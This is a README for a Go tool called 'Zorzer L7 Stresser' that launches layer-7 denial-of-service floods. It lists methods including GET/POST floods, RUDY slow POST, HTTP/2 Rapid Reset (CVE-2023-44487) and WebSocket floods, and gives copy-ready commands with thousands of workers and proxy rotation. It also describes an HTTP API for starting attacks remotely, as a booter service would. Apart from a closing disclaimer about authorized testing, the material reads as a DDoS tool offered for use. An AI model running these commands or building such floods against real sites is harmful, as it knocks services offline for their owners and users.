# Zorzer L7 Stresser

A high-performance, multi-method HTTP/S stress testing tool written in **Go**.
Supports HTTP and HTTPS, multiple attack vectors, proxy rotation, and massive concurrent worker pools.

---

## Methods

| Method       | Description                                                  |
| ------------ | ------------------------------------------------------------ |
| `httpget`    | Standard HTTP GET flood                                      |
| `httppost`   | HTTP POST with randomized form / JSON payloads               |
| `rudy`       | Slow POST — large `Content-Length`, drips bytes              |
| `apiflood`   | JSON API flood with randomized endpoints and nested payloads |
| `rapidreset` | HTTP/2 Rapid Reset (CVE-2023-44487)                          |
| `wsflood`    | WebSocket connection flood with mixed traffic                |

---

## Installation

### Prerequisites

* **Go 1.25+**

### Setup

```bash
bash setup.sh
```

---

## Usage

### CLI

```bash
zorzer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile] [-v] [-r ms]
```

| Flag | Default      | Description                             |
| ---- | ------------ | --------------------------------------- |
| `-t` | *(required)* | Target URL (e.g. `https://example.com`) |
| `-m` | `httpget`    | Attack method                           |
| `-w` | `2048`       | Number of concurrent workers            |
| `-d` | `30`         | Duration (seconds)                      |
| `-p` | *(none)*     | Proxy file path                         |
| `-v` | `false`      | Print request errors to stderr          |
| `-r` | `0`          | Delay in ms between requests per worker |

### API Server

```bash
zorzer -api
zorzer -api -api-port 9000
```

| Method | Endpoint              | Description        |
| ------ | --------------------- | ------------------ |
| POST   | `/api/attack/start`   | Start an attack    |
| POST   | `/api/attack/stop`    | Stop current attack|
| GET    | `/api/attack/status`  | Live stats         |
| GET    | `/api/health`         | Health check       |

**Start attack (JSON body):**

```json
{
  "target":   "https://example.com",
  "method":   "httpget",
  "workers":  2048,
  "duration": 60
}
```

---

## Examples

```bash
# GET flood (60s)
./zorzer -t https://target.com -m httpget -d 60

# POST flood via proxies (4096 workers)
./zorzer -t https://target.com -m httppost -w 4096 -d 120 -p proxies.txt

# HTTP/2 Rapid Reset
./zorzer -t https://target.com -m rapidreset -w 1024 -p proxies.txt

# WebSocket flood
./zorzer -t https://target.com -m wsflood -w 2048 -d 60

# API server mode
./zorzer -api
```

---

## Proxy File Format

One proxy per line. Supports HTTP / HTTPS / SOCKS5 with optional authentication.

```
http://proxy1.example.com:8080
http://user:pass@proxy2.example.com:3128
socks5://proxy3.example.com:1080
```

---

## Configuration

All defaults and credentials live in `config.json`:

```json
{
  "supabase": { "url": "...", "service_key": "..." },
  "api":      { "port": 8080 },
  "defaults": { "method": "httpget", "workers": 2048, "duration": 30 }
}
```

---

> **⚠️ Disclaimer**
> This tool is intended **only** for authorized security testing and research.
> Use **only** against systems you own or have **explicit written permission** to test.
> Unauthorized use is illegal.
